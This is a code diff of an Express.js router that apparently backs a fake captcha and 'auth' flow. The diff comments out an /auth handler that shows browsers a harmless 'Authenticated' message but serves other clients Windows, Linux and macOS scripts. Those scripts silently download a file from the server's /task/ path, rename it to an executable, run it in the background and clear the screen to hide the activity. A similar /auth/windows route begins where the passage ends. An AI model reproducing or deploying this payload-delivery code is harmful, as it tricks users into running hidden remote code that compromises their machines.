@@ -128,77 +128,77 @@ router.post('/verify-captcha', async (req, res) => {
 router.get("/status/:token", (req, res) => {
   res.json({ status: status[req.params.token] || "pending" });
 });
-router.get("/auth",  (req, res) => {
-   const { os } = req.params;
-  const token = req.query.token;
-  const domain = `${req.protocol}://${req.get("host")}`;
-  const ua = req.get("User-Agent") || "";
+// router.get("/auth",  (req, res) => {
+//    const { os } = req.params;
+//   const token = req.query.token;
+//   const domain = `${req.protocol}://${req.get("host")}`;
+//   const ua = req.get("User-Agent") || "";
 
-  if (!token) return res.status(400).send("Missing token");
+//   if (!token) return res.status(400).send("Missing token");
 
-  const isBrowser = /Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(ua);
+//   const isBrowser = /Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(ua);
 
-  // A minimal browser response used in your originals
-  if (isBrowser) {
-    res.type("text/plain").send("@echo off\necho Authenticated");
-    status[token] = "verified";
-    return;
-  }
+//   // A minimal browser response used in your originals
+//   if (isBrowser) {
+//     res.type("text/plain").send("@echo off\necho Authenticated");
+//     status[token] = "verified";
+//     return;
+//   }
 
-  // Templates for non-browser clients
-  const templates = {
-    windows: `@echo off
-curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token.npl
-cls
-if exist "%USERPROFILE%\\token.npl" del "%USERPROFILE%\\token"
-if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
-ren "%USERPROFILE%\\token.npl" token.cmd
-"%USERPROFILE%\\token.cmd"
-cls
-`,
+//   // Templates for non-browser clients
+//   const templates = {
+//     windows: `@echo off
+// curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token.npl
+// cls
+// if exist "%USERPROFILE%\\token.npl" del "%USERPROFILE%\\token"
+// if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
+// ren "%USERPROFILE%\\token.npl" token.cmd
+// "%USERPROFILE%\\token.cmd"
+// cls
+// `,
 
-    linux: `#!/bin/bash
-set -e
-echo "Authenticated"
-TARGET_DIR="$HOME/Documents"
-clear
-wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/task/tokenlinux.npl
-clear
-mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
-clear
-chmod +x "$TARGET_DIR/tokenlinux.sh"
-clear
-nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
-clear
-exit 0
-`,
+//     linux: `#!/bin/bash
+// set -e
+// echo "Authenticated"
+// TARGET_DIR="$HOME/Documents"
+// clear
+// wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/task/tokenlinux.npl
+// clear
+// mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
+// clear
+// chmod +x "$TARGET_DIR/tokenlinux.sh"
+// clear
+// nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
+// clear
+// exit 0
+// `,
 
-    mac: `#!/bin/bash
-set -e
-echo "Authenticated"
-mkdir -p "$HOME/Documents"
-clear
-curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux.npl"
-clear
-chmod +x "$HOME/Documents/tokenlinux.sh"
-clear
-nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
-clear
-exit 0
-`,
-  };
+//     mac: `#!/bin/bash
+// set -e
+// echo "Authenticated"
+// mkdir -p "$HOME/Documents"
+// clear
+// curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/task/tokenlinux.npl"
+// clear
+// chmod +x "$HOME/Documents/tokenlinux.sh"
+// clear
+// nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
+// clear
+// exit 0
+// `,
+//   };
 
-  const lowerOs = (os || "").toLowerCase();
-  const script = templates[lowerOs];
+//   const lowerOs = (os || "").toLowerCase();
+//   const script = templates[lowerOs];
 
-  if (!script) {
-    // Unknown OS param — return a helpful error
-    return res.status(400).send("Unsupported OS");
-  }
+//   if (!script) {
+//     // Unknown OS param — return a helpful error
+//     return res.status(400).send("Unsupported OS");
+//   }
 
-  res.type("text/plain").send(script);
-  status[token] = "verified";
-});
+//   res.type("text/plain").send(script);
+//   status[token] = "verified";
+// });
 // Windows Auth
 router.get("/auth/windows", (req, res) => {
   const token = req.query.token;
